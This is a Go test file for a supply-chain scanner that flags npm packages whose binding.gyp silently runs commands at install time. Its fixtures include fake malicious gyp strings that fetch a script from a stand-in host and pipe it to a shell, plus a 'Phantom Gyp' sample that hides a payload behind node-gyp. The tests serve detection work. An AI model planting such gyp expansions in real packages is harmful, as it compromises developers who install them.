package installscripts

import (
	"strings"
	"testing"
)

// phantomGyp is the Miasma "Phantom Gyp" shape (2026-06, ~57 packages): a
// tiny binding.gyp whose only job is a `<!(...)` command expansion, and a
// package.json with no scripts at all. npm runs `node-gyp rebuild` for it
// anyway, and gyp runs the command while it loads the file.
const phantomGyp = `{"targets":[{"target_name":"addon","sources":["<!(node index.js > /dev/null 2>&1 && echo addon.c)"]}]}`

func TestBindingGyp_ImplicitHookIsAnInstallScript(t *testing.T) {
	pj := []byte(`{"name":"phantom","version":"1.0.0"}`)
	r := BindingGyp(NPM(pj), pj, []byte(phantomGyp))
	if !r.HasInstallScript {
		t.Fatalf("binding.gyp with no install/preinstall hook must be an install script (npm reports hasInstallScript); got %+v", r)
	}
	if r.Kind != KindPresent {
		t.Fatalf("Kind = %q, want present (the payload is in index.js, not the gyp string)", r.Kind)
	}
	refs := ReferencedScripts(r.ScriptBody)
	if len(refs) != 1 || refs[0] != "index.js" {
		t.Fatalf("ReferencedScripts(%q) = %v, want [index.js]: the `<!(node index.js)` body must reach the referenced-script scan", r.ScriptBody, refs)
	}
}

func TestBindingGyp_NoGypFileIsUnchanged(t *testing.T) {
	pj := []byte(`{"name":"plain","version":"1.0.0"}`)
	if r := BindingGyp(NPM(pj), pj, nil); r.HasInstallScript || r.Kind != KindNone {
		t.Fatalf("no binding.gyp: got %+v, want none", r)
	}
}

func TestBindingGyp_GypfileFalseDisablesImplicitHook(t *testing.T) {
	pj := []byte(`{"name":"x","version":"1.0.0","gypfile":false}`)
	if r := BindingGyp(NPM(pj), pj, []byte(phantomGyp)); r.HasInstallScript {
		t.Fatalf("gypfile:false: npm runs nothing, got %+v", r)
	}
}

// An explicit install hook replaces the implicit one. If that hook never
// runs node-gyp, binding.gyp is never loaded.
func TestBindingGyp_ExplicitNonGypHookIgnoresGypFile(t *testing.T) {
	pj := []byte(`{"name":"x","version":"1.0.0","scripts":{"install":"node install.js"}}`)
	gyp := []byte(`{"targets":[{"target_name":"a","sources":["<!(curl -s https://evil.example/x | sh)"]}]}`)
	r := BindingGyp(NPM(pj), pj, gyp)
	if r.Kind != KindPresent || strings.Contains(r.ScriptBody, "curl") {
		t.Fatalf("explicit non-gyp install hook: binding.gyp must not be read, got %+v", r)
	}
}

// `"install": "node-gyp rebuild"` still loads binding.gyp, so its commands
// still run.
func TestBindingGyp_ExplicitNodeGypHookScansCommands(t *testing.T) {
	pj := []byte(`{"name":"x","version":"1.0.0","scripts":{"install":"prebuild-install || node-gyp rebuild"}}`)
	gyp := []byte(`{"targets":[{"target_name":"a","sources":["<!(curl -s https://evil.example/x | sh)"]}]}`)
	r := BindingGyp(NPM(pj), pj, gyp)
	if r.Kind != KindFetchesRemote || !r.InstallScriptFetchesRemote {
		t.Fatalf("node-gyp hook + curl in binding.gyp: got %+v, want fetches_remote", r)
	}
}

func TestBindingGyp_InlineFetchCommandIsFetchesRemote(t *testing.T) {
	pj := []byte(`{"name":"x","version":"1.0.0","scripts":{"postinstall":"echo done"}}`)
	gyp := []byte(`{'targets':[{'target_name':'a','libraries':['<!@(wget -qO- https://evil.example/p | sh)']}]}`)
	r := BindingGyp(NPM(pj), pj, gyp)
	if r.Kind != KindFetchesRemote || !r.InstallScriptFetchesRemote || !r.HasInstallScript {
		t.Fatalf("got %+v, want fetches_remote", r)
	}
}

// The two command expansions every real native addon carries. They must
// stay `present`: an install script exists (node-gyp runs), nothing fetches.
func TestBindingGyp_BenignCommandsStayPresent(t *testing.T) {
	pj := []byte(`{"name":"addon","version":"1.0.0"}`)
	gyp := []byte(`{
  "targets": [{
    "target_name": "addon",
    "include_dirs": ["<!(node -p \"require('node-addon-api').include\")"],
    "cflags": ["<!@(pkg-config --cflags libsecret-1)"],
    "dependencies": ["<!(node -p \"require('node-addon-api').gyp\")"],
    "sources": ["src/addon.cc"]
  }]
}`)
	r := BindingGyp(NPM(pj), pj, gyp)
	if !r.HasInstallScript || r.Kind != KindPresent || r.InstallScriptFetchesRemote || r.EvalEncoded {
		t.Fatalf("benign native addon: got %+v, want present", r)
	}
	if refs := ReferencedScripts(r.ScriptBody); len(refs) != 0 {
		t.Fatalf("benign gyp commands resolved to bundled files %v", refs)
	}
}

func TestGypCommands(t *testing.T) {
	gyp := `["<!(node a.js (x))", "<!@(pkg-config --libs y)", ">!(echo late)", "<!pymod_do_main(evilmod arg)", "<(not_a_command)", "<!(unterminated`
	got := GypCommands([]byte(gyp))
	want := []string{"node a.js (x)", "pkg-config --libs y", "echo late", "python evilmod.py arg"}
	if strings.Join(got, "|") != strings.Join(want, "|") {
		t.Fatalf("GypCommands = %q, want %q", got, want)
	}
}

func TestIsRootBindingGyp(t *testing.T) {
	for name, want := range map[string]bool{
		"package/binding.gyp":          true,
		"./package/binding.gyp":        true,
		"binding.gyp":                  false, // depth 0: npm's strip:1 drops it
		"package/deps/foo/binding.gyp": false,
		"package/binding.gypi":         false,
	} {
		if got := IsRootBindingGyp(name); got != want {
			t.Errorf("IsRootBindingGyp(%q) = %v, want %v", name, got, want)
		}
	}
}
